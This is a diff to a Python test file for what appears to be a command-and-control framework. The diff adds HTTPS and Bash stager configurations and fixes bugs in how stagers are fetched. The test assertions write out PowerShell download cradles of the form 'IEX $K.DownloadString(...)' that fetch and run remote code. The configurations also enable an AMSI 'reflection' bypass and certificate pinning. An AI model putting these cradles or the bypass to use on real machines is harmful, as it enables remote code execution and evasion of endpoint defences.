@@ -21,7 +21,7 @@ init_tests()
 
 
 def get_stager():
-    result = []
+    result = {}
     PORT = '8080'
     param_set = {
         'default': {
@@ -35,16 +35,40 @@ def get_stager():
             "RadioFingerprint": "true",
             "RadioNoVerification": "false",
             "RadioCertStore": "false",
-        }
+        },
+        'HTTPS': {
+            "flavor": "hub",
+            "GroupLauncher": "powershell",
+            "GroupAmsi": "reflection",
+            "GroupTransport": "https",
+            "GroupClipExec": "none",
+            "CheckboxProxy": "false",
+            "CheckboxTLS1.2": "false",
+            "RadioFingerprint": "true",
+            "RadioNoVerification": "false",
+            "RadioCertStore": "false",
+        },
+        'BASH': {
+            "flavor": "hub",
+            "GroupLauncher": "bash",
+            "GroupAmsi": "reflection",
+            "GroupTransport": "http",
+            "GroupClipExec": "none",
+            "CheckboxProxy": "false",
+            "CheckboxTLS1.2": "false",
+            "RadioFingerprint": "true",
+            "RadioNoVerification": "false",
+            "RadioCertStore": "false",
+        },
     }
     i = 0
     while i < 10:
         try:
-            for k, v in param_set:
+            for k, v in param_set.items():
                 result[k] = requests.get(f"http://{TEST_URI}:{PORT}/dlcradle",
                                          params=v).text
             break
-        except Exception:
+        except requests.exceptions.ConnectionError:
             i += 1
             time.sleep(.5)
     result["POWERSHELL_ESCAPED_QUOTES"] = result["default"].replace('"',
@@ -70,4 +94,12 @@ def test_stager(full_app):
         "$K=New-Object Net.WebClient;IEX "
         + f"$K.DownloadString('http://{TEST_URI}:8080"
         + "/0?t=http&f=h&a=reflection');"
+    )
+    assert full_app['HTTPS'].startswith(
+        "[System.Net.ServicePointManager]::ServerCertificateValidationCallback"
+        + "={param($1,$2);$2.Thumbprint -eq '"
+    )
+    assert full_app['HTTPS'].endswith(
+        "'};$K=New-Object Net.WebClient;IEX $K.DownloadString"
+        + f"('https://{TEST_URI}:8443/0?t=https&f=h&a=reflection');"
     )
